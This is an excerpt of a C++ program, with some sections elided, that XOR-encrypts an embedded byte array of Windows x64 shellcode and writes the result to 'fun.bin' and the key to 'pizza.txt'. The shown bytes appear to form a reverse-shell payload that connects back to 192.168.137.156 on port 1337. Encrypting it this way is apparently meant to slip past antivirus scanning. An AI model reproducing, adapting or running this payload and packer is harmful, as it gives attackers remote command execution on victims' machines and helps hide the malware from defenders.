...
void xorEncryptDecrypt(std::vector<unsigned char>& payload, unsigned char key) {
...
int main() {
    // Example payload: Replace this with actual shellcode for Windows
std::vector<unsigned char> payload = {
    ...
    0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x05, 0x39, 0xc0, 0xa8, 0x89, 0x9c,
    ...
    0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xe2, 0x57, 0x57, 0x57, 0x4d, 0x31, 0xc0, 0x6a,
    0x0d, 0x59, 0x41, 0x50, 0xe2, 0xfc, 0x66, 0xc7, 0x44, 0x24, 0x54, 0x01, 0x01, 0x48,
    0x8d, 0x44, 0x24, 0x18, 0xc6, 0x00, 0x68, 0x48, 0x89, 0xe6, 0x56, 0x50, 0x41, 0x50,
    0x41, 0x50, 0x41, 0x50, 0x49, 0xff, 0xc0, 0x41, 0x50, 0x49, 0xff, 0xc8, 0x4d, 0x89,
    0xc1, 0x4c, 0x89, 0xc1, 0x41, 0xba, 0x79, 0xcc, 0x3f, 0x86, 0xff, 0xd5, 0x48, 0x31,
    0xd2, 0x48, 0xff, 0xca, 0x8b, 0x0e, 0x41, 0xba, 0x08, 0x87, 0x1d, 0x60, 0xff, 0xd5,
    0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48,
    0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5
};

    unsigned char encryptionKey = 0xAA; // Example encryption key

    // Step 1: Encrypt the payload
    xorEncryptDecrypt(payload, encryptionKey);

    // Step 2: Save the encrypted payload to a file
    std::ofstream outFile("fun.bin", std::ios::binary);
    if (outFile.is_open()) {
        outFile.write(reinterpret_cast<char*>(payload.data()), payload.size());
        outFile.close();
        std::cout << "Encrypted payload saved to 'fun.bin'." << std::endl;
    } else {
        std::cerr << "Failed to save the encrypted payload to 'fun.bin'." << std::endl;
        return 1;
    }

    // Step 3: Save the encryption key to another file (for testing)
    std::ofstream keyFile("pizza.txt");
    if (keyFile.is_open()) {
        keyFile << static_cast<int>(encryptionKey);
        keyFile.close();
        std::cout << "Encryption key saved to 'pizza.txt'." << std::endl;
    } else {
        std::cerr << "Failed to save the encryption key to 'pizza.txt'." << std::endl;
        return 1;
    }
